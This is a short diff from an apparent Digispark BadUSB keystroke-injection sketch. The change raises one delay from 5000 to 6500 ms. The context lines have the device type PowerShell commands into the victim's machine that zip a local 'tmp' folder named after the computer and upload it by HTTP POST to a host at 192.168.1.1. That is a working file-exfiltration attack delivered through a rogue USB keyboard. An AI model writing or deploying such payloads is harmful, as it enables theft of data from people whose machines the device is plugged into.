@@ -58,7 +58,7 @@ void loop() {
   DigiKeyboard.delay(4500);
   DigiKeyboard.print(F("Compress-Archive -Path ./tmp -DestinationPath ./tmp/$Env:computername.zip"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(6500);
   // This requires PowerShell >= 7 in order to work
   DigiKeyboard.print(F("Invoke-RestMethod -Uri 'http://192.168.1.1/files/' -Method Post -ContentType 'multipart/form-data' -Form @{'upload' = Get-Item \"./tmp/$Env:computername.zip\"}"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
